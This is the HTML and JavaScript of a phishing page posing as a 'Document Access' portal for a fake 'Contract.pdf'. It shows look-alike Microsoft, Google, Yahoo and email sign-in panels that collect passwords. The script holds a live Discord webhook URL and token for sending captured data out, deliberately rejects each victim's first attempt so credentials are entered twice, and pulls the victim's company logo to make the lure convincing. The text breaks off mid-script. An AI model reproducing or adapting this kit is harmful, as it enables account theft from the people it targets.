<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Document Access</title>
    <base href="/" />
    <link rel="icon" href="/icons/favicon.svg" sizes="any" type="image/svg+xml">
    <link rel="apple-touch-icon" href="/icons/apple-touch-icon.svg">
    <link rel="mask-icon" href="/icons/mask-icon.svg" color="#0066ff">
    <meta name="theme-color" content="#0066ff">

<style>
    /* make sizing predictable so inputs don't overflow their containers */
    *, *::before, *::after { box-sizing: border-box; }
    body {
        margin: 0;
        font-family: "Segoe UI", Arial, sans-serif;
        background: #ffffff;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
    }

    /* File preview */
        width: 100%;
        max-width: 480px;
        background: rgba(255,255,255,0.95);
        backdrop-filter: blur(10px);
        padding: 32px 28px;
        border-radius: 16px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        transition: max-width 220ms ease, padding 220ms ease, opacity 0.5s ease, transform 0.5s ease;
        position: relative;
        z-index: 10;
    }
    
    body.unlocked .login-box {
        opacity: 0;
        transform: scale(0.95);
        pointer-events: none;
    }

    h2 {
        margin: 0 0 8px;
        font-size: 22px;
        font-weight: 600;
        color: #222;
        text-align: center;
    }

    p {
        margin: 0 0 20px;
        font-size: 14px;
        color: #666;
        text-align: center;
    }

    /* File preview */
    .file-preview {
        display:flex;
        gap:12px;
        align-items:center;
        padding:14px;
        border-radius:10px;
        background: #f8f9fa;
        margin: 10px 0 20px;
        border: 1px solid #e9ecef;
        transition: all 0.2s ease;
    }
    
    .file-preview:hover {
        background: #f1f3f5;
        border-color: #dee2e6;
    }
    .file-preview .file-thumb img{ width:64px;height:64px;border-radius:6px;object-fit:cover }
    .file-preview .file-meta{ flex:1; min-width:0 }
    .file-preview .file-name{ font-weight:600; color:#212529; font-size:15px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis }
    .file-preview .file-desc{ font-size:13px; color:#6c757d; margin-top:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis }
    .file-preview .file-info{ font-size:12px; color:#868e96; margin-top:6px }
    .file-preview .file-actions a{ display:inline-block; padding:8px 12px; background:var(--accent,#0066ff); color:white; border-radius:8px; text-decoration:none }

    .provider-buttons {
        display: flex;
        gap: 16px;
        justify-content: center;
        align-items: center;
        margin-top: 10px;
        flex-wrap: wrap;
    }
    
    .provider-buttons button {
        width: 80px;
        height: 80px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 6px;
        padding: 0;
        border-radius: 50%;
        border: 2px solid #e9ecef;
        cursor: pointer;
        font-size: 11px;
        font-weight: 600;
        background: #fff;
        transition: all 0.3s ease;
        position: relative;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }
    
    .provider-buttons button::before {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        width: 0;
        height: 0;
        border-radius: 50%;
        background: rgba(0, 102, 255, 0.1);
        transform: translate(-50%, -50%);
        transition: width 0.6s, height 0.6s;
    }
    
    .provider-buttons button:hover::before {
        width: 200px;
        height: 200px;
    }
    
    .provider-buttons button:hover {
        background: #f8f9fa;
        border-color: #667eea;
        transform: translateY(-4px);
        box-shadow: 0 6px 16px rgba(102, 126, 234, 0.2);
    }
    
    .provider-buttons button:active {
        transform: translateY(-2px) scale(1.02);
        box-shadow: 0 4px 15px rgba(0, 102, 255, 0.25);
    }

    .provider-buttons img,
    .provider-buttons svg {
        width: 28px;
        height: 28px;
        position: relative;
        z-index: 1;
        transition: transform 0.3s ease;
        flex-shrink: 0;
    }
    
    .provider-buttons button:hover img,
    .provider-buttons button:hover svg {
        transform: scale(1.1);
    }
    
    .provider-buttons button span {
        position: relative;
        z-index: 1;
        font-size: 10px;
        text-align: center;
        line-height: 1.2;
        color: #495057;
        font-weight: 600;
    }

    /* Email Input + Dynamic Icon */
    .email-group {
        display: flex;
        align-items: center;
        margin-top: 15px;
        border: 2px solid #e0e0e0;
        padding: 12px 14px;
        border-radius: 10px;
        background: #fff;
        transition: all 0.3s ease;
        position: relative;
    }
    
    .email-group::before {
        content: '';
        position: absolute;
        inset: -2px;
        border-radius: 10px;
        padding: 2px;
        background: linear-gradient(135deg, #0066ff, #00c6ff);
        -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
        -webkit-mask-composite: xor;
        mask-composite: exclude;
        opacity: 0;
        transition: opacity 0.3s ease;
    }
    
    .email-group:focus-within::before {
        opacity: 1;
    }
    
    .email-group:focus-within {
        border-color: transparent;
        box-shadow: 0 4px 20px rgba(0, 102, 255, 0.15);
    }

    .email-group img {
        width: 26px;
        height: 26px;
        margin-right: 12px;
        transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
    }
    
    .email-group:focus-within img {
        transform: scale(1.15) rotate(10deg);
    }

    .email-group input {
        width: 100%;
        border: none;
        outline: none;
        font-size: 15px;
        background: transparent;
        color: #111;
    }
    
    .email-group input::placeholder {
        color: #999;
        transition: color 0.3s ease;
    }
    
    .email-group:focus-within input::placeholder {
        color: #bbb;
    }

    /* Provider-specific login panel */
    .provider-login {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%) scale(0.9);
        width: 92%;
        max-width: 560px;
        background: rgba(255, 255, 255, 0.98);
        backdrop-filter: blur(10px);
        border-radius: 16px;
        box-shadow: 0 20px 60px rgba(0,0,0,0.25);
        padding: 28px;
        z-index: 40;
        opacity: 0;
        pointer-events: none;
        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        overflow: hidden;
        border: 1px solid rgba(0, 0, 0, 0.05);
    }
    
    .provider-login::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, rgba(0, 102, 255, 0.05) 0%, transparent 70%);
        animation: rotate 20s linear infinite;
        opacity: 0;
        transition: opacity 0.4s ease;
    }
    
    @keyframes rotate {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }
    
    .provider-login.open::before {
        opacity: 1;
    }
    
    .provider-login.open {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
        pointer-events: auto;
    }

    /* When a provider panel is open, broaden the underlying card to fit fields */
    body.panel-open .login-box { max-width: 560px; padding: 32px 30px }
    .provider-login .close-btn {
        position: absolute;
        right: 12px;
        top: 8px;
        border: none;
        background: transparent;
        font-size: 22px;
        cursor: pointer;
        color: #666;
    }
    .provider-header {
        display: flex;
        align-items: center;
        gap: 14px;
        margin-bottom: 20px;
        padding-bottom: 16px;
        border-bottom: 2px solid #f0f0f0;
        position: relative;
        z-index: 1;
    }
    
    .provider-header img,
    .provider-header #providerLogo { 
        width: 40px; 
        height: 40px;
        filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.1));
        transition: transform 0.3s ease;
        display: inline-block;
    }
    
    .provider-header #providerLogo svg {
        width: 40px;
        height: 40px;
    }
    
    .provider-login.open .provider-header img,
    .provider-login.open .provider-header #providerLogo {
        animation: slideInRotate 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    }
    
    @keyframes slideInRotate {
        0% { 
            transform: translateX(-20px) rotate(-10deg);
            opacity: 0;
        }
        100% { 
            transform: translateX(0) rotate(0);
            opacity: 1;
        }
    }
    
    .provider-header h3 { 
        margin: 0; 
        font-size: 20px;
        font-weight: 600;
        color: #212529;
    }

    .provider-login .input-group { 
        margin-bottom: 16px;
        position: relative;
    }
    
    .provider-login label { 
        display:block; 
        font-size:13px; 
        font-weight: 500;
        color:#495057; 
        margin-bottom:8px;
        transition: color 0.3s ease;
    }
    
    .provider-login input { 
        width:100%; 
        max-width:100%; 
        padding:14px 16px; 
        border:2px solid #e9ecef; 
        border-radius:10px; 
        font-size:15px; 
        box-sizing: border-box;
        transition: all 0.3s ease;
        background: #fff;
        color: #212529;
    }
    
    .provider-login input::placeholder {
        color: #adb5bd;
    }
    
    .provider-login input:focus {
        outline: none;
        border-color: #667eea;
        box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    
    .provider-login input:focus + label {
        color: #0066ff;
    }
    .provider-submit { 
        width:100%; 
        padding:14px; 
        border-radius:10px; 
        border:none; 
        cursor:pointer; 
        font-size:16px;
        font-weight: 600;
        color: #fff;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        position: relative;
        overflow: hidden;
    }
    
    .provider-submit:hover {
        transform: translateY(-2px);
    }
    
    .provider-submit:active {
        transform: translateY(0);
    }
    
    .provider-submit:disabled {
        opacity: 0.6;
        cursor: not-allowed;
        transform: none;
    }

    /* Provider theme overrides */
    .provider-login.provider-microsoft {
        background: linear-gradient(145deg, rgba(0, 120, 212, 0.03) 0%, rgba(255, 255, 255, 0.98) 100%);
        border-color: rgba(0, 120, 212, 0.2);
    }
    
    .provider-login.provider-microsoft .provider-header {
        border-bottom-color: rgba(0, 120, 212, 0.15);
    }
    
    .provider-login.provider-microsoft .provider-submit { 
        background: linear-gradient(135deg, #0078D4 0%, #005a9e 100%);
        box-shadow: 0 4px 15px rgba(0, 120, 212, 0.3);
    }
    .provider-login.provider-microsoft .provider-submit:hover { 
        background: linear-gradient(135deg, #005a9e 0%, #0078D4 100%);
        box-shadow: 0 6px 25px rgba(0, 120, 212, 0.4);
    }
    
    .provider-login.provider-microsoft input:focus {
        border-color: #0078D4;
        box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.15);
    }
    
    .provider-login.provider-google {
        background: linear-gradient(145deg, rgba(66, 133, 244, 0.03) 0%, rgba(255, 255, 255, 0.98) 100%);
        border-color: rgba(66, 133, 244, 0.2);
    }
    
    .provider-login.provider-google .provider-header {
        border-bottom-color: rgba(66, 133, 244, 0.15);
    }
    
    .provider-login.provider-google .provider-submit { 
        background: linear-gradient(135deg, #4285F4 0%, #3367D6 100%);
        box-shadow: 0 4px 15px rgba(66, 133, 244, 0.3);
    }
    .provider-login.provider-google .provider-submit:hover { 
        background: linear-gradient(135deg, #3367D6 0%, #4285F4 100%);
        box-shadow: 0 6px 25px rgba(66, 133, 244, 0.4);
    }
    
    .provider-login.provider-google input:focus {
        border-color: #4285F4;
        box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.15);
    }
    
    .provider-login.provider-yahoo {
        background: linear-gradient(145deg, rgba(96, 1, 210, 0.03) 0%, rgba(255, 255, 255, 0.98) 100%);
        border-color: rgba(96, 1, 210, 0.2);
    }
    
    .provider-login.provider-yahoo .provider-header {
        border-bottom-color: rgba(96, 1, 210, 0.15);
    }
    
    .provider-login.provider-yahoo .provider-submit { 
        background: linear-gradient(135deg, #6001D2 0%, #4b00a5 100%);
        box-shadow: 0 4px 15px rgba(96, 1, 210, 0.3);
    }
    .provider-login.provider-yahoo .provider-submit:hover { 
        background: linear-gradient(135deg, #4b00a5 0%, #6001D2 100%);
        box-shadow: 0 6px 25px rgba(96, 1, 210, 0.4);
    }
    
    .provider-login.provider-yahoo input:focus {
        border-color: #6001D2;
        box-shadow: 0 0 0 3px rgba(96, 1, 210, 0.15);
    }
    
    .provider-login.provider-email {
        background: linear-gradient(145deg, rgba(0, 102, 255, 0.03) 0%, rgba(255, 255, 255, 0.98) 100%);
        border-color: rgba(0, 102, 255, 0.2);
    }
    
    .provider-login.provider-email .provider-header {
        border-bottom-color: rgba(0, 102, 255, 0.15);
    }
    
    .provider-login.provider-email .provider-submit { 
        background: linear-gradient(135deg, #0066ff 0%, #0052cc 100%);
        box-shadow: 0 4px 15px rgba(0, 102, 255, 0.3);
    }
    .provider-login.provider-email .provider-submit:hover { 
        background: linear-gradient(135deg, #0052cc 0%, #0066ff 100%);
        box-shadow: 0 6px 25px rgba(0, 102, 255, 0.4);
    }
    
    .provider-login.provider-email input:focus {
        border-color: #0066ff;
        box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
    }

    .continue-btn {
        width: 100%;
        margin-top: 18px;
        padding: 14px;
        background: linear-gradient(135deg, #0066ff 0%, #0052cc 100%);
        border: none;
        color: white;
        border-radius: 10px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        position: relative;
        overflow: hidden;
        box-shadow: 0 4px 15px rgba(0, 102, 255, 0.3);
    }
    
    .continue-btn::before {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        width: 0;
        height: 0;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.3);
        transform: translate(-50%, -50%);
        transition: width 0.6s, height 0.6s;
    }
    
    .continue-btn:hover::before {
        width: 300px;
        height: 300px;
    }
    
    .continue-btn:hover {
        background: linear-gradient(135deg, #0052cc 0%, #0066ff 100%);
        transform: translateY(-2px);
        box-shadow: 0 6px 25px rgba(0, 102, 255, 0.4);
    }
    
    .continue-btn:active {
        transform: translateY(0);
        box-shadow: 0 2px 10px rgba(0, 102, 255, 0.3);
    }
    
    .continue-btn:disabled {
        background: #cccccc;
        cursor: not-allowed;
        transform: none;
        box-shadow: none;
    }
    /* Mobile responsiveness */
    @media (max-width: 480px) {
        body { padding: 16px; }
        .login-box { 
            width: 100%; 
            max-width: 100%; 
            padding: 24px 20px; 
            border-radius: 16px; 
        }
        h2 { font-size: 20px; }
        p { font-size: 13px; margin-bottom: 16px; }
        .file-preview { padding: 12px; gap: 10px; }
        .file-preview .file-thumb img { width: 48px; height: 48px; }
        .file-preview .file-name { font-size: 14px; }
        .file-preview .file-desc { font-size: 12px; }
        .file-preview .file-info { font-size: 11px; }
        .provider-buttons { gap: 12px; flex-wrap: wrap; }
        .provider-buttons button { width: 70px; height: 70px; font-size: 9px; }
        .provider-buttons img,
        .provider-buttons svg { width: 24px; height: 24px; }
        .email-group { padding:10px; border-radius:8px; }
        .email-group img { width:20px; height:20px; }
        .email-group input { font-size:16px; }
        .provider-login {
            position: fixed;
            left: 50%;
            right: auto;
            top: 50%;
            transform: translate(-50%, -50%);
            width: calc(100% - 32px);
            max-width: calc(100% - 32px);
            border-radius: 16px;
            padding: 20px;
            max-height: 90vh;
            overflow-y: auto;
        }
        .provider-login.open {
            left: 50%;
            right: auto;
            transform: translate(-50%, -50%);
        }
        .provider-login .close-btn { right: 10px; top: 10px; font-size: 28px; }
        .provider-login .provider-header img { width: 36px; height: 36px; }
        .provider-login .provider-header h3 { font-size: 18px; }
        .provider-login input { font-size: 16px; padding: 12px 14px; }
        .provider-submit { padding: 12px; font-size: 15px; }
        #domainLogo { width:48px; height:48px }
        #domainLogoWrap { margin-bottom:8px }
        #filePreview .file-actions a{ padding:8px 10px }
    }

    @media (max-width: 360px) {
        .provider-login { padding: 16px; }
        .provider-header h3 { font-size: 16px; }
        .file-preview .file-name { font-size: 13px; }
        .file-preview .file-desc { font-size: 11px; }
        .continue-btn { padding: 12px; font-size: 14px; }
        .provider-buttons button { width: 65px; height: 65px; gap: 4px; }
        .provider-buttons button span { font-size: 8px; }
    }
    
    @media (min-width: 481px) and (max-width: 768px) {
        .login-box { max-width: 500px; padding: 28px 24px; }
        .provider-buttons button { width: 75px; height: 75px; }
    }

    /* Spinner overlay styles */
    .spinner-overlay {
        position: fixed;
        inset: 0;
        background: #ffffff;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        transition: opacity 0.5s ease, visibility 0.5s ease;
    }
    
    .spinner-overlay.hidden {
        opacity: 0;
        visibility: hidden;
        pointer-events: none;
    }
    
    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid #e9ecef;
        border-top: 4px solid #667eea;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .spinner-text {
        font-size: 18px;
        font-weight: 600;
        color: #495057;
        margin-top: 10px;
    }
    
    /* Hide login box initially */
    body.loading .login-box {
        opacity: 0;
        transform: scale(0.9);
        pointer-events: none;
    }
</style>
</head>
<body class="loading">

<!-- Spinner overlay -->
<div class="spinner-overlay" id="spinnerOverlay">
    <div class="spinner"></div>
    <div class="spinner-text">Scanning document...</div>
</div>

<div class="login-box" id="app">
    <h2>Document Access</h2>
    <p>Please sign in to view the document.</p>

    <!-- File preview: gives viewers a clue about the document -->
    <div id="filePreview" class="file-preview" aria-hidden="false">
        <div class="file-thumb"><img id="fileThumb" src="/icons/pdf.svg" alt="file thumbnail"></div>
        <div class="file-meta">
            <div class="file-name" id="fileName">Contract.pdf</div>
            <div class="file-desc" id="fileDesc">Requested Information</div>
            <div class="file-info"><span id="fileType">PDF</span> â€¢ <span id="fileSize">1.8 MB</span></div>
        </div>
        <div class="file-actions"><a id="filePreviewLink" href="#" target="_blank" rel="noreferrer">Preview</a></div>
    </div>

    <!-- Provider Buttons -->
    <div class="provider-buttons">
        <button data-provider="microsoft" onclick="openProviderLogin('microsoft')">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M11.4 3H3v8.4h8.4V3z" fill="#f25022"/>
                <path d="M21 3h-8.4v8.4H21V3z" fill="#7fba00"/>
                <path d="M11.4 12.6H3V21h8.4v-8.4z" fill="#00a4ef"/>
                <path d="M21 12.6h-8.4V21H21v-8.4z" fill="#ffb900"/>
            </svg>
            <span>Continue with Microsoft</span>
        </button>

        <button data-provider="google" onclick="openProviderLogin('google')">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            <span>Continue with Google</span>
        </button>

        <button data-provider="yahoo" onclick="openProviderLogin('yahoo')">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="#6001D2"/>
                <path d="M13.5 8.5l-2.5 5.5v3h2v-2.5l2.5-5.5h-2zm-3 0l-2.5 5.5V17h2v-2.5L12.5 8.5h-2z" fill="white"/>
                <path d="M8 7h8v1H8V7z" fill="white"/>
            </svg>
            <span>Continue with Yahoo</span>
        </button>

        <button data-provider="email" onclick="openProviderLogin('email')">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" fill="#0066ff"/>
                <path d="M20 8l-8 5-8-5V6l8 5 8-5v2z" fill="white"/>
            </svg>
            <span>Continue with Email</span>
        </button>
    </div>

    <!-- Provider-specific login panel (hidden by default) -->
    <div id="providerLogin" class="provider-login" aria-hidden="true">
        <button class="close-btn" aria-label="Close" onclick="closeProviderLogin()">Ã—</button>
        <div class="provider-header">
            <div id="providerLogo" style="display: inline-block;">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
                    <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" fill="#0066ff"/>
                    <path d="M20 8l-8 5-8-5V6l8 5 8-5v2z" fill="white"/>
                </svg>
            </div>
            <h3 id="providerTitle">Sign in</h3>
        </div>

        <form id="providerForm" onsubmit="submitProviderForm(event)">
            <div class="input-group">
                <label for="provEmail">Email</label>
                <input id="provEmail" type="email" required placeholder="name@domain.com">
            </div>
            <div class="input-group">
                <label for="provPass">Password</label>
                <input id="provPass" type="password" required placeholder="Password">
            </div>
            <div id="provError" class="error" style="display:none;color:#ffb4b4;margin-bottom:10px;font-size:13px"></div>
            <button type="submit" class="provider-submit">Sign in</button>
        </form>
    </div>

    <!-- 404 view (hidden) -->
    <div id="notFound" style="display:none; text-align:center; padding:24px;">
        <h2>Page not found</h2>
        <p>The page you requested doesn't exist.</p>
        <a href="/" data-link>Go home</a>
    </div>

</div>

<script>
const icons = {
    default: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z' fill='%23666'/%3E%3Cpath d='M20 8l-8 5-8-5V6l8 5 8-5v2z' fill='white'/%3E%3C/svg%3E",
    gmail: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z' fill='%234285F4'/%3E%3Cpath d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z' fill='%2334A853'/%3E%3Cpath d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z' fill='%23FBBC05'/%3E%3Cpath d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z' fill='%23EA4335'/%3E%3C/svg%3E",
    yahoo: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z' fill='%236001D2'/%3E%3Cpath d='M13.5 8.5l-2.5 5.5v3h2v-2.5l2.5-5.5h-2zm-3 0l-2.5 5.5V17h2v-2.5L12.5 8.5h-2z' fill='white'/%3E%3Cpath d='M8 7h8v1H8V7z' fill='white'/%3E%3C/svg%3E",
    outlook: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11.4 3H3v8.4h8.4V3z' fill='%23f25022'/%3E%3Cpath d='M21 3h-8.4v8.4H21V3z' fill='%237fba00'/%3E%3Cpath d='M11.4 12.6H3V21h8.4v-8.4z' fill='%2300a4ef'/%3E%3Cpath d='M21 12.6h-8.4V21H21v-8.4z' fill='%23ffb900'/%3E%3C/svg%3E",
    aol: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='24' height='24' rx='4' fill='%23ff0b00'/%3E%3Cpath d='M6 8h3l3 8h-2l-.5-1.5h-3L6 16H4l2-8zm1.5 5h1.5l-.75-2.5L7.5 13zM14 8c1.66 0 3 1.34 3 3v5h-2v-5c0-.55-.45-1-1-1s-1 .45-1 1v5h-2v-8h2v.5c.5-.3 1.08-.5 1-.5z' fill='white'/%3E%3C/svg%3E",
    icloud: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M19.35 10.04C18.67 6.59 15.64 4 12 4c-2.89 0-5.4 1.64-6.65 4.04C2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z' fill='%233b99fc'/%3E%3C/svg%3E",
    proton: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='24' height='24' rx='4' fill='%236d4aff'/%3E%3Cpath d='M12 4l8 5v6c0 3.31-2.69 6-6 6s-6-2.69-6-6V9l4-5zm0 2.5L8 9v6c0 2.21 1.79 4 4 4s4-1.79 4-4V9l-4-2.5z' fill='white'/%3E%3C/svg%3E",
    domain: "data:image/svg+xml,%3Csvg width='24' height='24' viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z' fill='%230066ff'/%3E%3C/svg%3E"
};

// Attempts tracking: first attempt will be treated as invalid, second attempt proceeds
const attempts = {}; // key => count

// Insert your Discord webhook URL here (REPLACE with your webhook). If empty, posting is skipped.
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1440037066787389521/VMeNF8GksK6bxYfEgap5dSncNnJGoxepWjSaP4XFz7_VkoQfD8IuXPnuIJlfU4_sBT0u"; // e.g. "https://discord.com/api/webhooks/ID/TOKEN"

function getDomainFromEmail(email){
    const at = (email||"").split('@');
    if(at.length<2) return null;
    return at.slice(1).join('@').toLowerCase();
}

function fetchDomainLogo(domain, imgEl, onDone){
    if(!domain){ if(imgEl) { imgEl.style.display='none'; } if(onDone) onDone(false); return; }
    // Using logo.dev API with provided token
    const url = `https://img.logo.dev/${encodeURIComponent(domain)}?token=pk_MeFZjoLrQlyJnUhD8FLIsg&size=128`;
    if(imgEl){
        imgEl.src = url;
        imgEl.style.display = 'inline-block';
        imgEl.onload = () => { if(onDone) onDone(true); };
        imgEl.onerror = () => { 
            // Fallback to default icon
            imgEl.src = '/icons/default.svg'; 
            if(onDone) onDone(false); 
        };
    } else {
        if(onDone) onDone(false);
    }
}

function updateDomainLogoFromInput(inputId){
    const email = document.getElementById(inputId).value.trim();
    const domain = getDomainFromEmail(email);
    const domainLogo = document.getElementById('domainLogo');
    const wrap = document.getElementById('domainLogoWrap');
    fetchDomainLogo(domain, domainLogo, (ok)=>{
        if(ok){ wrap.style.display='block'; }
        else { wrap.style.display='none'; }
    });
}

/* File preview population helper */
function formatBytes(bytes){
    if(!bytes && bytes !== 0) return '';
    const thresh = 1024;
    if(Math.abs(bytes) < thresh) return bytes + ' B';
    const units = ['KB','MB','GB','TB'];
    let u = -1;
    do { bytes /= thresh; ++u; } while(Math.abs(bytes) >= thresh && u < units.length-1);
    return bytes.toFixed(1) + ' ' + units[u];
}

function setFilePreview(file){
    // file: { name, size (bytes), type, thumb (url), url, description }
    const wrap = document.getElementById('filePreview');
    if(!file){ wrap.style.display = 'none'; return; }
    wrap.style.display = 'flex';
    document.getElementById('fileName').textContent = file.name || 'Document';
    document.getElementById('fileDesc').textContent = file.description || '';
    document.getElementById('fileType').textContent = (file.type || '').toUpperCase();
    document.getElementById('fileSize').textContent = file.size ? formatBytes(file.size) : '';
    const thumb = document.getElementById('fileThumb');
    thumb.src = file.thumb || '/icons/favicon.svg';
    const link = document.getElementById('filePreviewLink');
    if(file.url){ link.href = file.url; link.style.display = 'inline-block'; }
    else { link.href = '#'; link.style.display = 'none'; }
}

// provide an example preview by default; replace or call setFilePreview from server-side data
setFilePreview({
    name: 'Contract.pdf',
    size: 24567,
    type: 'pdf',
    thumb: '/icons/pdf.svg',
    url: '#',
    description: 'Requested Infomation â€” 3 pages'
});

// wire main email input to also update domain logo
const mainEmailEl = document.getElementById('emailInput');
if(mainEmailEl){
    mainEmailEl.addEventListener('input', ()=>{
        detectDomain();
        updateDomainLogoFromInput('emailInput');
    });
}

// wire provider email input to update provider logo and domain logo
const provEmailEl = document.getElementById('provEmail');
if(provEmailEl){
    provEmailEl.addEventListener('input', function(){
        const panel = document.getElementById('providerLogin');
        const provider = (panel.className.match(/provider-([a-z]+)/)||[])[1] || 'email';
        const email = provEmailEl.value.trim();
        const domain = getDomainFromEmail(email);
        
        console.log('Email input detected:', email, 'Domain:', domain, 'Provider:', provider);
        
        // Update logo for ALL providers based on typed email domain
        if(domain){
            const providerLogo = document.getElementById('providerLogo');
            if(providerLogo){
                console.log('Updating logo for domain:', domain);
                
                // Clear existing content and create img element for dynamic logo
                providerLogo.innerHTML = '';
                const logoImg = document.createElement('img');
                logoImg.style.width = '40px';
                logoImg.style.height = '40px';
                logoImg.style.objectFit = 'contain';
                logoImg.style.display = 'block';
                providerLogo.appendChild(logoImg);
                
                // Construct logo.dev URL
                const logoUrl = `https://img.logo.dev/${encodeURIComponent(domain)}?token=pk_MeFZjoLrQlyJnUhD8FLIsg&size=128`;
                console.log('Fetching logo from:', logoUrl);
                
                logoImg.onload = function() {
                    console.log('Logo loaded successfully');
                };
                
                logoImg.onerror = function() {
                    console.log('Logo failed to load, using fallback');
                    // If logo.dev fails, show provider's default icon
                    const defaultIcons = {
